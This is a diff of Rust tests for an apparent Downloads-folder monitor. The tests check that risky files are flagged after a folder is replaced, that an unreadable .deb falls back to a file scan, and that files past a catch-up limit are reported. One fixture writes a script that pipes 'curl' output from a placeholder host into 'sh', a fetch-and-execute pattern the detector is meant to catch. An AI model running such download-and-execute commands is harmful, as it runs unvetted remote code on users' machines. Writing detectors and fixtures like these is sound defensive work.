@@ -515,6 +515,9 @@ fn downloads_are_checked_once_settled_and_posted_once() {
     let downloads = dir.path().join("Downloads");
     std::fs::create_dir(&downloads).unwrap();
     std::fs::write(downloads.join("old.txt"), "here before the watch").unwrap();
+    // A file from the very second the watch first starts is looked at again after
+    // a restart (the cursor is whole seconds); this one is older than that.
+    std::thread::sleep(std::time::Duration::from_millis(1100));
     let mut source = Downloads::new(downloads.clone(), crate::runner::cancel()).settle_after(0);
     let now = crate::model::now();
     // The first run ever watches from now; what was already there is not checked.
@@ -560,4 +563,81 @@ fn downloads_are_checked_once_settled_and_posted_once() {
     let (caught_up, _) = run(&w, &mut restarted, crate::model::now()).unwrap();
     assert_eq!(caught_up.len(), 1, "{caught_up:?}");
     assert_eq!(caught_up[0].rule.as_deref(), Some("shell.execute-download"));
+}
+
+#[test]
+fn downloads_are_watched_again_after_the_folder_is_replaced() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let downloads = dir.path().join("Downloads");
+    std::fs::create_dir(&downloads).unwrap();
+    let mut source = Downloads::new(downloads.clone(), crate::runner::cancel()).settle_after(0);
+    assert!(run(&w, &mut source, crate::model::now())
+        .unwrap()
+        .0
+        .is_empty());
+    std::fs::remove_dir_all(&downloads).unwrap();
+    std::fs::create_dir(&downloads).unwrap();
+    // The removal is seen and the watch dropped; the next run watches the new folder.
+    run(&w, &mut source, crate::model::now()).unwrap();
+    std::fs::write(
+        downloads.join("setup.sh"),
+        "#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n",
+    )
+    .unwrap();
+    let mut seen = vec![];
+    for _ in 0..2 {
+        seen.extend(run(&w, &mut source, crate::model::now()).unwrap().0);
+    }
+    assert_eq!(seen.len(), 1, "{seen:?}");
+    assert_eq!(seen[0].rule.as_deref(), Some("shell.execute-download"));
+}
+
+#[test]
+fn a_package_its_inspector_cannot_read_is_scanned_instead() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let downloads = dir.path().join("Downloads");
+    std::fs::create_dir(&downloads).unwrap();
+    let mut source = Downloads::new(downloads.clone(), crate::runner::cancel()).settle_after(0);
+    run(&w, &mut source, crate::model::now()).unwrap();
+    std::fs::write(downloads.join("tool_1.0_amd64.deb"), "not a package").unwrap();
+    let (events, _) = run(&w, &mut source, crate::model::now()).unwrap();
+    assert_eq!(events.len(), 1, "{events:?}");
+    assert!(
+        events[0].evidence.contains("Checked with: File scan"),
+        "{}",
+        events[0].evidence
+    );
+    let Some(Link::Report { id }) = &events[0].link else {
+        panic!("no report: {:?}", events[0]);
+    };
+    let r = w.store.report(id).unwrap();
+    assert!(r.coverage.skipped.iter().any(|s| s.what == "Package check"));
+}
+
+#[test]
+fn files_past_the_catch_up_limit_are_named_not_dropped() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let downloads = dir.path().join("Downloads");
+    std::fs::create_dir(&downloads).unwrap();
+    let mut source = Downloads::new(downloads.clone(), crate::runner::cancel()).settle_after(0);
+    run(&w, &mut source, crate::model::now()).unwrap();
+    drop(source);
+    for n in 0..3 {
+        std::fs::write(
+            downloads.join(format!("setup{n}.sh")),
+            format!("#!/bin/sh\necho {n}\n"),
+        )
+        .unwrap();
+    }
+    let mut restarted = Downloads::new(downloads, crate::runner::cancel())
+        .settle_after(0)
+        .catch_up(2);
+    let (events, _) = run(&w, &mut restarted, crate::model::now()).unwrap();
+    assert_eq!(events.len(), 3, "{events:?}");
+    assert!(events
+        .iter()
+        .any(|e| e.summary == "1 more new file in Downloads was not checked"));
 }
